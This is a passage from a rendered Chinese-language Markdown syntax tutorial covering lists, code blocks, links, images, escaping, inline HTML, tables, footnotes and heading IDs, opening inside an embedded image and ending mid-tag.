gw3phh+YkOpLvLgLRIszWDDzfY91R4y0rcur4/kCAwzv3bl360DMtxvxeH1ze3fi9v76eDYU572hWBxI9CaQh/u7Ho/3l29DSXShDALh2u9H0So65HFYYHbX+GN9ICb59QG35enx7i23D/RCWN/b+wrM7VWjpJYfd+e5HnT8hPR7pS0tn8N2qIWXSmMxwJd02143MTp8X2HfobV49TInaIk0jxFX9tMu7xidxeZrBPTr5ddJE73Vur6b5qG/XiT1w3EIhkS3SS4fNZLbIzFRHT1emJ6CTJZ4xPy803FDNT73OmiTYnUSi5hfd3quiIkBpy8Jx14MdJK43uiPd3puX5LikoQu86KVSMDQV9agwqQwJAmtxGglZCPkrOsFXShMZOkkAWqIEghdIINQ+Ih0usi1piUmagRJX+oyMgjFxQnf8Tg5WgkXidHfh3oeukntWRP5Wkk30f1+r+PxIUGHwRaNhEPp0q7n5igd9HB48YRGArfbiHruKfTxCleOP7Zi5EVR7Hnq1HWUjt/kgi/qMGn0gRJgValndts6lnfW1lWETBXo43hjx6EQ+/4rzFgeb97j+EnmXqkdhljh2eNCXqm+xQ95ftDxFGGnlMrRsUzTtMjPnSFs/r9Me2OxvNRX8dHI1TMZWsqseYeIYSwyxlL1WNUhR3SvX61DewWzbu+1yl/n3gt8HFSfDWpcnUUSMsUc8Mw+VS8U/eeWawPbVL2mQE2isfzw0F5apengRo1WEVnIDzs1oHt9bUxbrgQqNUJutg6fE/WWZbf7f09JXKgxVmhbSbkbuw80RFMTy6VRqjGWEHUgKNQIGRqskVmYIWOtxtg0W8VAqsZYo8E9fk6itr6sJWqUFA023YxLzAlJiriW7NRE4hrG1+uRO9coB+6TLlI1SpVrJLzhCzUB9xaBCzXODkxMvzUbfuI+fbmQdXVNVpgjr8Z7sMBGTZGetj32aooVQj4xanrwBFtrsbDWmv9j09NkD16paQroJVUZTBTwk8SFXuLhoKZJEY5Nkj8fKIDSkFuLBDulofDl5c05xRVF9nRK+fmYLMxSacktQVdDzf0V8WuLpZoiyxFoi4tJgTiiy1837ar9vn86UuTgxG5KsYZ/es6jUHrWAEzXI6KrZy6JKDIsMOVkFL4hF++VZGDs2DCESIzA9NEyWpsXtYLBSumpMMrIPW7WjYIxy0rp+ahkCQSyfxbNL2aXrGBHwy9tLfdFlu70zVgvaR2OHM6OblznsVyvlunE4GLFRij4ak+4RmxyfR3OOhZD2qsCvqpcDT08bxpJ/fFD7FzvGCKSGNhevLlMjL/oW77Nx0KLNHzky6pXjXsEi1HscjdoVTGHrNdYwLpINyfDxWr6dWLk9y1Z2d2QltDx0RJzNU5ZijruKsthicVHiFzjRKgN3jOB9f6w3gJWt8lnRzg2ANMJF+f5P0W+bcQV1sTgAAAAAElFTkSuQmCC" alt="Tux, the Linux mascot"></p></li><li><p>Close the file.</p></li></ol><h4 id="列表-2">列表</h4><p>You can nest an unordered list in an ordered list, or vice versa.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. First item</span><br><span class="line">2. Second item</span><br><span class="line">3. Third item</span><br><span class="line">    - Indented item</span><br><span class="line">    - Indented item</span><br><span class="line">4. Fourth item</span><br></pre></td></tr></table></figure><p>渲染效果如下：</p><ol><li>First item</li><li>Second item</li><li>Third item<ul><li>Indented item</li><li>Indented item</li></ul></li><li>Fourth item</li></ol><h2 id="代码">代码</h2><p>要将单词或短语表示为代码，请将其包裹在反引号 (`) 中。</p><p><img src="%E4%BB%A3%E7%A0%81.png" alt=""></p><h3 id="转义反引号">转义反引号</h3><p>如果你要表示为代码的单词或短语中包含一个或多个反引号，则可以通过将单词或短语包裹在双反引号(``)中。</p><p><img src="%E8%BD%AC%E4%B9%89%E5%8F%8D%E5%BC%95%E5%8F%B7.png" alt=""></p><h3 id="代码块-2">代码块</h3><p>要创建代码块，请将代码块的每一行缩进至少四个空格或一个制表符。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>渲染效果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><strong>Note:</strong> 要创建不用缩进的代码块，请使用围栏式代码块（fenced code blocks）。</p><h3 id="围栏式代码块">围栏式代码块</h3><p>Markdown基本语法允许您通过将行缩进四个空格或一个制表符来创建代码块。如果发现不方便，请尝试使用受保护的代码块。根据Markdown处理器或编辑器的不同，您将在代码块之前和之后的行上使用三个反引号（`````）或三个波浪号（~~~）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">&#123;</span><br><span class="line">  &quot;firstName&quot;: &quot;John&quot;,</span><br><span class="line">  &quot;lastName&quot;: &quot;Smith&quot;,</span><br><span class="line">  &quot;age&quot;: 25</span><br><span class="line">&#125;</span><br><span class="line">```</span><br></pre></td></tr></table></figure><p>呈现的输出如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;firstName&quot;: &quot;John&quot;,</span><br><span class="line">  &quot;lastName&quot;: &quot;Smith&quot;,</span><br><span class="line">  &quot;age&quot;: 25</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="语法高亮">语法高亮</h3><p>许多Markdown处理器都支持受围栏代码块的语法突出显示。使用此功能，您可以为编写代码的任何语言添加颜色突出显示。要添加语法突出显示，请在受防护的代码块之前的反引号旁边指定一种语言。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">```json</span><br><span class="line">&#123;</span><br><span class="line">  &quot;firstName&quot;: &quot;John&quot;,</span><br><span class="line">  &quot;lastName&quot;: &quot;Smith&quot;,</span><br><span class="line">  &quot;age&quot;: 25</span><br><span class="line">&#125;</span><br><span class="line">```</span><br></pre></td></tr></table></figure><p>呈现的输出如下所示：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;firstName&quot;</span>: <span class="string">&quot;John&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;lastName&quot;</span>: <span class="string">&quot;Smith&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;age&quot;</span>: <span class="number">25</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分隔符">分隔符</h2><h3 id="分隔符语法">分隔符语法</h3><p>要创建分隔线，请在单独一行上使用三个或多个星号 (<code>***</code>)、破折号 (<code>---</code>) 或下划线 (<code>___</code>) ，并且不能包含其他内容。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">***</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">_________________</span><br></pre></td></tr></table></figure><p>以上三个分隔线的渲染效果看起来都一样：</p><hr><h4 id="分隔线（Horizontal-Rule）用法最佳实践">分隔线（Horizontal Rule）用法最佳实践</h4><p>为了兼容性，请在分隔线的前后均添加空白行。</p><p><img src="%E5%88%86%E5%89%B2%E7%BA%BF%E6%9C%80%E4%BD%B3%E7%94%A8%E6%B3%95.png" alt=""></p><h2 id="链接">链接</h2><h3 id="链接语法">链接语法</h3><p>链接文本放在中括号内，链接地址放在后面的括号中，链接title可选。</p><p>超链接Markdown语法代码：<code>[超链接显示名](超链接地址 &quot;超链接title&quot;)</code></p><p>对应的HTML代码：<code>&lt;a href=&quot;超链接地址&quot; title=&quot;超链接title&quot;&gt;超链接显示名&lt;/a&gt;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这是一个链接 [Markdown语法](https://markdown.com.cn)。</span><br></pre></td></tr></table></figure><p>渲染效果如下：</p><p>这是一个链接 <a href="https://markdown.com.cn/">Markdown语法</a>。</p><h4 id="给链接增加-Title">给链接增加 Title</h4><p>链接title是当鼠标悬停在链接上时会出现的文字，这个title是可选的，它放在圆括号中链接地址后面，跟链接地址之间以空格分隔。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这是一个链接 [Markdown语法](https://markdown.com.cn &quot;最好的markdown教程&quot;)。</span><br></pre></td></tr></table></figure><p>渲染效果如下：</p><p>这是一个链接 <a href="https://markdown.com.cn/" title="最好的markdown教程">Markdown语法</a>。</p><h4 id="网址和Email地址">网址和Email地址</h4><p>使用尖括号可以很方便地把URL或者email地址变成可点击的链接。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;https://markdown.com.cn&gt;</span><br><span class="line">&lt;fake@example.com&gt;</span><br></pre></td></tr></table></figure><p>渲染效果如下：</p><p><a href="https://markdown.com.cn/">https://markdown.com.cn/</a><br><a href="mailto:fake@example.com">mailto:fake@example.com</a></p><h4 id="带格式化的链接">带格式化的链接</h4><p>强调链接, 在链接语法前后增加星号。 要将链接表示为代码，请在方括号中添加反引号。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">I love supporting the **[EFF](https://eff.org)**.</span><br><span class="line">This is the *[Markdown Guide](https://www.markdownguide.org)*.</span><br><span class="line">See the section on [`code`](#code).</span><br></pre></td></tr></table></figure><p>渲染效果如下：</p><p>I love supporting the <strong><a href="https://eff.org/">EFF</a></strong>.<br>This is the <em><a href="https://www.markdownguide.org/">Markdown Guide</a></em>.<br>See the section on <a href="#code"><code>code</code></a>.</p><h4 id="引用类型链接">引用类型链接</h4><p>引用样式链接是一种特殊的链接，它使URL在Markdown中更易于显示和阅读。参考样式链接分为两部分：与文本保持内联的部分以及存储在文件中其他位置的部分，以使文本易于阅读。</p><h5 id="链接的第一部分格式">链接的第一部分格式</h5><p>引用类型的链接的第一部分使用两组括号进行格式设置。第一组方括号包围应显示为链接的文本。第二组括号显示了一个标签，该标签用于指向您存储在文档其他位置的链接。</p><p>尽管不是必需的，可以在第一组和第二组括号之间包含一个空格。第二组括号中的标签不区分大小写，可以包含字母，数字，空格或标点符号。</p><p>以下示例格式对于链接的第一部分效果相同：</p><ul><li><code>[hobbit-hole][1]</code></li><li><code>[hobbit-hole] [1]</code></li></ul><h5 id="链接的第二部分格式">链接的第二部分格式</h5><p>引用类型链接的第二部分使用以下属性设置格式：</p><ol><li>放在括号中的标签，其后紧跟一个冒号和至少一个空格（例如 [label]:  ）。</li><li>链接的URL，可以选择将其括在尖括号中。</li><li>链接的可选标题，可以将其括在双引号，单引号或括号中。</li></ol><p>以下示例格式对于链接的第二部分效果相同：</p><ul><li><code>[1]: https://en.wikipedia.org/wiki/Hobbit#Lifestyle</code></li><li><code>[1]: https://en.wikipedia.org/wiki/Hobbit#Lifestyle &quot;Hobbit lifestyles&quot;</code></li><li><code>[1]: https://en.wikipedia.org/wiki/Hobbit#Lifestyle 'Hobbit lifestyles'</code></li><li><code>[1]: https://en.wikipedia.org/wiki/Hobbit#Lifestyle (Hobbit lifestyles)</code></li><li><code>[1]: &lt;https://en.wikipedia.org/wiki/Hobbit#Lifestyle&gt; &quot;Hobbit lifestyles&quot;</code></li><li><code>[1]: &lt;https://en.wikipedia.org/wiki/Hobbit#Lifestyle&gt; 'Hobbit lifestyles'</code></li><li><code>[1]: &lt;https://en.wikipedia.org/wiki/Hobbit#Lifestyle&gt; (Hobbit lifestyles)</code></li></ul><p>可以将链接的第二部分放在Markdown文档中的任何位置。有些人将它们放在出现的段落之后，有些人则将它们放在文档的末尾（例如尾注或脚注）。</p><h4 id="将两部分组合在一起使用的示例">将两部分组合在一起使用的示例</h4><p>假设你将一个 URL 作为一个标准 URL 链接添加到段落中，在 Markdown 中如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">In a hole in the ground there lived a hobbit. Not a nasty, dirty, wet hole, filled with the ends</span><br><span class="line">of worms and an oozy smell, nor yet a dry, bare, sandy hole with nothing in it to sit down on or to</span><br><span class="line">eat: it was a [hobbit-hole](https://en.wikipedia.org/wiki/Hobbit#Lifestyle &quot;Hobbit lifestyles&quot;), and that means comfort.</span><br></pre></td></tr></table></figure><p>虽然它可能指向有趣的附加信息，但显示的URL除了使其更难阅读之外，实际上并没有对现有的原始文本增加太多内容。要解决此问题，您可以改为按如下方式设置URL的格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In a hole in the ground there lived a hobbit. Not a nasty, dirty, wet hole, filled with the ends</span><br><span class="line">of worms and an oozy smell, nor yet a dry, bare, sandy hole with nothing in it to sit down on or to</span><br><span class="line">eat: it was a [hobbit-hole][1], and that means comfort.</span><br><span class="line"></span><br><span class="line">[1]: &lt;https://en.wikipedia.org/wiki/Hobbit#Lifestyle&gt; &quot;Hobbit lifestyles&quot;</span><br></pre></td></tr></table></figure><p>在上述两个实例中，渲染后的输出是相同的：</p><blockquote><p>In a hole in the ground there lived a hobbit. Not a nasty, dirty, wet hole, filled with the ends of worms and an oozy smell, nor yet a dry, bare, sandy hole with nothing in it to sit down on or to eat: it was a <a href="https://en.wikipedia.org/wiki/Hobbit#Lifestyle">hobbit-hole</a>, and that means comfort.</p></blockquote><p>该链接的 HTML 为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;https://en.wikipedia.org/wiki/Hobbit#Lifestyle&quot; title=&quot;Hobbit lifestyles&quot;&gt;hobbit-hole&lt;/a&gt;</span><br></pre></td></tr></table></figure><h4 id="链接最佳实践">链接最佳实践</h4><p>不同的 Markdown 应用程序处理URL中间的空格方式不一样。为了兼容性，请尽量使用%20代替空格。</p><p><img src="%E9%93%BE%E6%8E%A5%E6%9C%80%E4%BD%B3%E7%94%A8%E6%B3%95.png" alt=""></p><h2 id="图片-2">图片</h2><h3 id="图片语法">图片语法</h3><p>要添加图像，请使用感叹号 (<code>!</code>), 然后在方括号增加替代文本，图片链接放在圆括号里，括号里的链接后可以增加一个可选的图片标题文本。</p><p>插入图片Markdown语法代码：<code>![图片alt](图片链接 &quot;图片title&quot;)</code>。</p><p>对应的HTML代码：<code>&lt;img src=&quot;图片链接&quot; alt=&quot;图片alt&quot; title=&quot;图片title&quot;&gt;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![这是图片](/assets/img/philly-magic-garden.jpg &quot;Magic Gardens&quot;)</span><br></pre></td></tr></table></figure><p>渲染效果如下：</p><p><img src="https://markdown.com.cn/assets/img/philly-magic-garden.9c0b4415.jpg" alt="这是图片"></p><h3 id="链接图片">链接图片</h3><p>给图片增加链接，请将图像的Markdown 括在方括号中，然后将链接添加在圆括号中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[![沙漠中的岩石图片](/assets/img/shiprock.jpg &quot;Shiprock&quot;)](https://markdown.com.cn)</span><br></pre></td></tr></table></figure><p>渲染效果如下：</p><p><a href="https://markdown.com.cn/"><img src="https://markdown.com.cn/assets/img/shiprock.c3b9a023.jpg" alt="沙漠中的岩石图片"></a></p><h2 id="转义字符">转义字符</h2><h3 id="转义字符语法">转义字符语法</h3><p>要显示原本用于格式化 Markdown 文档的字符，请在字符前面添加反斜杠字符 \ 。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\* Without the backslash, this would be a bullet in an unordered list.</span><br></pre></td></tr></table></figure><p>渲染效果如下：</p><p>* Without the backslash, this would be a bullet in an unordered list.</p><h4 id="可做转义的字符">可做转义的字符</h4><p>以下列出的字符都可以通过使用反斜杠字符从而达到转义目的。</p><table><thead><tr><th>Character</th><th>Name</th></tr></thead><tbody><tr><td>\</td><td>反斜杠（backslash）</td></tr><tr><td>`</td><td>backtick (另请参见在代码中转义反引号)</td></tr><tr><td>*</td><td>星号（asterisk）</td></tr><tr><td>_</td><td>下划线（underscore）</td></tr><tr><td>{ }</td><td>花括号（curly braces）</td></tr><tr><td>[ ]</td><td>方括号（brackets）</td></tr><tr><td>&lt;&gt;</td><td>尖括号（angle brackets）</td></tr><tr><td>( )</td><td>圆括号或括号（parentheses）</td></tr><tr><td>#</td><td>井号（pound sign）</td></tr><tr><td>+</td><td>加号（plus sign）</td></tr><tr><td>-</td><td>减号（minus sign） (也叫连字符 hyphen)</td></tr><tr><td>.</td><td>句点（dot）</td></tr><tr><td>!</td><td>感叹号（exclamation mark）</td></tr><tr><td>|</td><td>管道符（pipe） (另请参见在表格中转义管道符)</td></tr></tbody></table><h4 id="特殊字符自动转义">特殊字符自动转义</h4><p>在 HTML 文件中，有两个字符需要特殊处理： <code>&lt;</code> 和 <code>&amp;</code> 。 <code>&lt;</code> 符号用于起始标签，<code>&amp;</code> 符号则用于标记 HTML 实体，如果你只是想要使用这些符号，你必须要使用实体的形式，像是 <code>&amp;lt;</code> 和 <code>&amp;amp;</code>。</p><p><code>&amp;</code> 符号其实很容易让写作网页文件的人感到困扰，如果你要打「AT&amp;T」 ，你必须要写成「<code>AT&amp;amp;T</code>」 ，还得转换网址内的 <code>&amp;</code> 符号，如果你要链接到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://images.google.com/images?num=30&amp;q=larry+bird</span><br></pre></td></tr></table></figure><p>你必须要把网址转成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://images.google.com/images?num=30&amp;amp;q=larry+bird</span><br></pre></td></tr></table></figure><p>才能放到链接标签的 <code>href</code> 属性里。不用说也知道这很容易忘记，这也可能是 HTML 标准检查所检查到的错误中，数量最多的。</p><p>Markdown 允许你直接使用这些符号，它帮你自动转义字符。如果你使用 <code>&amp;</code> 符号的作为 HTML 实体的一部分，那么它不会被转换，而在其它情况下，它则会被转换成 <code>&amp;</code>。所以你如果要在文件中插入一个著作权的符号，你可以这样写：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;copy;</span><br></pre></td></tr></table></figure><p>Markdown 将不会对这段文字做修改，但是如果你这样写：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AT&amp;T</span><br></pre></td></tr></table></figure><p>Markdown 就会将它转为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AT&amp;amp;T</span><br></pre></td></tr></table></figure><p>类似的状况也会发生在 <code>&lt;</code> 符号上，因为 Markdown 支持行内 HTML ，如果你使用 <code>&lt;</code> 符号作为 HTML 标签的分隔符，那 Markdown 也不会对它做任何转换，但是如果你是写：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4 &lt; 5</span><br></pre></td></tr></table></figure><p>Markdown 将会把它转换为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4 &amp;lt; 5</span><br></pre></td></tr></table></figure><p>需要特别注意的是，在 Markdown 的块级元素和内联元素中， <code>&lt;</code> 和 <code>&amp;</code> 两个符号都会被自动转换成 HTML 实体，这项特性让你可以很容易地用 Markdown 写 HTML。（在 HTML 语法中，你要手动把所有的 <code>&lt;</code> 和 <code>&amp;</code> 都转换为 HTML 实体。）</p><h2 id="HTML-标签">HTML 标签</h2><p>对于 Markdown 涵盖范围之外的标签，都可以直接在文件里面用 HTML 本身。如需使用 HTML，不需要额外标注这是 HTML 或是 Markdown，只需 HTML 标签添加到 Markdown 文本中即可。</p><h3 id="行级內联标签">行级內联标签</h3><p>HTML 的行级內联标签如 <code>&lt;span&gt;</code>、<code>&lt;cite&gt;</code>、<code>&lt;del&gt;</code> 不受限制，可以在 Markdown 的段落、列表或是标题里任意使用。依照个人习惯，甚至可以不用 Markdown 格式，而采用 HTML 标签来格式化。例如：如果比较喜欢 HTML 的 <code>&lt;a&gt;</code> 或 <code>&lt;img&gt;</code> 标签，可以直接使用这些标签，而不用 Markdown 提供的链接或是图片语法。当你需要更改元素的属性时（例如为文本指定颜色或更改图像的宽度），使用 HTML 标签更方便些。</p><p>HTML 行级內联标签和区块标签不同，在內联标签的范围内， Markdown 的语法是可以解析的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">This **word** is bold. This &lt;em&gt;word&lt;/em&gt; is italic.</span><br></pre></td></tr></table></figure><p>渲染效果如下:</p><p>This <strong>word</strong> is bold. This <em>word</em> is italic.</p><h3 id="区块标签">区块标签</h3><p>区块元素──比如 <code>&lt;div&gt;</code>、<code>&lt;table&gt;</code>、<code>&lt;pre&gt;</code>、<code>&lt;p&gt;</code> 等标签，必须在前后加上空行，以便于内容区分。而且这些元素的开始与结尾标签，不可以用 tab 或是空白来缩进。Markdown 会自动识别这区块元素，避免在区块标签前后加上没有必要的 <code>&lt;p&gt;</code> 标签。</p><p>例如，在 Markdown 文件里加上一段 HTML 表格：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">This is a regular paragraph.</span><br><span class="line"></span><br><span class="line">&lt;table&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;td&gt;Foo&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">&lt;/table&gt;</span><br><span class="line"></span><br><span class="line">This is another regular paragraph.</span><br></pre></td></tr></table></figure><p>请注意，Markdown 语法在 HTML 区块标签中将不会被进行处理。例如，你无法在 HTML 区块内使用 Markdown 形式的<code>*强调*</code>。</p><h3 id="HTML-用法最佳实践">HTML 用法最佳实践</h3><p>出于安全原因，并非所有 Markdown 应用程序都支持在 Markdown 文档中添加 HTML。如有疑问，请查看相应 Markdown 应用程序的手册。某些应用程序只支持 HTML 标签的子集。</p><p>对于 HTML 的块级元素 <code>&lt;div&gt;</code>、<code>&lt;table&gt;</code>、<code>&lt;pre&gt;</code> 和 <code>&lt;p&gt;</code>，请在其前后使用空行（blank lines）与其它内容进行分隔。尽量不要使用制表符（tabs）或空格（spaces）对 HTML 标签做缩进，否则将影响格式。</p><p>在 HTML 块级标签内不能使用 Markdown 语法。例如 <code>&lt;p&gt;italic and **bold**&lt;/p&gt;</code> 将不起作用。</p><h2 id="表格">表格</h2><h3 id="表格语法">表格语法</h3><p>要添加表，请使用三个或多个连字符（<code>---</code>）创建每列的标题，并使用管道符（<code>|</code>）分隔每列。您可以选择在表的任一端添加管道符。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">| Syntax      | Description |</span><br><span class="line">| ----------- | ----------- |</span><br><span class="line">| Header      | Title       |</span><br><span class="line">| Paragraph   | Text        |</span><br></pre></td></tr></table></figure><p>呈现的输出如下所示：</p><table><thead><tr><th>Syntax</th><th>Description</th></tr></thead><tbody><tr><td>Header</td><td>Title</td></tr><tr><td>Paragraph</td><td>Text</td></tr></tbody></table><p>单元格宽度可以变化，如下所示。呈现的输出将看起来相同。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">| Syntax | Description |</span><br><span class="line">| --- | ----------- |</span><br><span class="line">| Header | Title |</span><br><span class="line">| Paragraph | Text |</span><br></pre></td></tr></table></figure><p><strong>Tip:</strong> 使用连字符和管道创建表可能很麻烦。为了加快该过程，请尝试使用<a href="https://www.tablesgenerator.com/markdown_tables">Markdown Tables Generator</a>。使用图形界面构建表，然后将生成的Markdown格式的文本复制到文件中。</p><h3 id="对齐">对齐</h3><p>您可以通过在标题行中的连字符的左侧，右侧或两侧添加冒号（<code>:</code>），将列中的文本对齐到左侧，右侧或中心。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">| Syntax      | Description | Test Text     |</span><br><span class="line">| :---        |    :----:   |          ---: |</span><br><span class="line">| Header      | Title       | Here&#x27;s this   |</span><br><span class="line">| Paragraph   | Text        | And more      |</span><br></pre></td></tr></table></figure><p>呈现的输出如下所示：</p><table><thead><tr><th style="text-align:left">Syntax</th><th style="text-align:center">Description</th><th style="text-align:right">Test Text</th></tr></thead><tbody><tr><td style="text-align:left">Header</td><td style="text-align:center">Title</td><td style="text-align:right">Here’s this</td></tr><tr><td style="text-align:left">Paragraph</td><td style="text-align:center">Text</td><td style="text-align:right">And more</td></tr></tbody></table><h3 id="格式化表格中的文字">格式化表格中的文字</h3><p>您可以在表格中设置文本格式。例如，您可以添加链接，代码（仅反引号（```）中的单词或短语，而不是代码块）和强调。</p><p>您不能添加标题，块引用，列表，水平规则，图像或HTML标签。</p><h3 id="在表中转义管道字符">在表中转义管道字符</h3><p>您可以使用表格的HTML字符代码（<code>&amp;#124;</code>）在表中显示竖线（<code>|</code>）字符。</p><h2 id="脚注">脚注</h2><h3 id="脚注语法">脚注语法</h3><p>脚注使您可以添加注释和参考，而不会使文档正文混乱。当您创建脚注时，带有脚注的上标数字会出现在您添加脚注参考的位置。读者可以单击链接以跳至页面底部的脚注内容。</p><p>要创建脚注参考，请在方括号（<code>[^1]</code>）内添加插入符号和标识符。标识符可以是数字或单词，但不能包含空格或制表符。标识符仅将脚注参考与脚注本身相关联-在输出中，脚注按顺序编号。</p><p>在括号内使用另一个插入符号和数字添加脚注，并用冒号和文本（<code>[^1]: My footnote.</code>）。您不必在文档末尾添加脚注。您可以将它们放在除列表，块引号和表之类的其他元素之外的任何位置。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Here&#x27;s a simple footnote,[^1] and here&#x27;s a longer one.[^bignote]</span><br><span class="line"></span><br><span class="line">[^1]: This is the first footnote.</span><br><span class="line"></span><br><span class="line">[^bignote]: Here&#x27;s one with multiple paragraphs and code.</span><br><span class="line"></span><br><span class="line">    Indent paragraphs to include them in the footnote.</span><br><span class="line"></span><br><span class="line">    `&#123; my code &#125;`</span><br><span class="line"></span><br><span class="line">    Add as many paragraphs as you like.</span><br></pre></td></tr></table></figure><p>呈现的输出如下所示：</p><p>Here’s a simple footnote,[^1] and here’s a longer one.[^bignote]</p><p>[^1]: This is the first footnote.<br>[^bignote]: Here’s one with multiple paragraphs and code.</p><p>​Indent paragraphs to include them in the footnote.</p><p>​<code>&#123; my code &#125;</code></p><p>​Add as many paragraphs as you like.</p><h2 id="标题编号">标题编号</h2><h3 id="标题编号语法">标题编号语法</h3><p>许多Markdown处理器支持标题的自定义ID - 一些Markdown处理器会自动添加它们。添加自定义ID允许您直接链接到标题并使用CSS对其进行修改。要添加自定义标题ID，请在与标题相同的行上用大括号括起该自定义ID。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">### My Great Heading &#123;#custom-id&#125;</span><br></pre></td></tr></table></figure><p>HTML看起来像这样：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h3</span> <span class="attr">id</span>=<span class="string">&quot;custom-id&quot;</span>&gt;</span>My Great Heading<span class="tag">&lt;/<span 